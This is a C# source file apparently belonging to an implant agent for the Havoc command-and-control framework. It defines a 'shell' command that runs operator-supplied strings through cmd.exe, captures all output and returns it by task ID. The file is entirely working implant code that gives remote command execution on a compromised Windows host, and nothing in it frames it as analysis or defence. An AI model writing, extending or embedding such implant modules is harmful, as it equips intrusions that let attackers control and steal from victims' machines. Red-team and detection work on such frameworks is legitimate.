using HavocImplant.AgentFunctions.BofExec.Internals;
using HavocImplant.Communications;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;

namespace HavocImplant.AgentFunctions
{
    public class Shell : CommandInterface
    {
        public override string Command => "shell";
        public override bool Dangerous => false;

        public override void Run(string command, int taskId)
        {
            Output = "";
            //Console.WriteLine("Running cmd.exe /c " + command);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c " + command;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.OutputDataReceived += (sender, args) => Output += args.Data + Environment.NewLine;
            process.ErrorDataReceived += (sender, args) => Output += args.Data + Environment.NewLine;
            process.Start();
            process.BeginErrorReadLine();
            process.BeginOutputReadLine();
            
            process.WaitForExit();
            ReturnOutput(taskId);

         }
    }
}
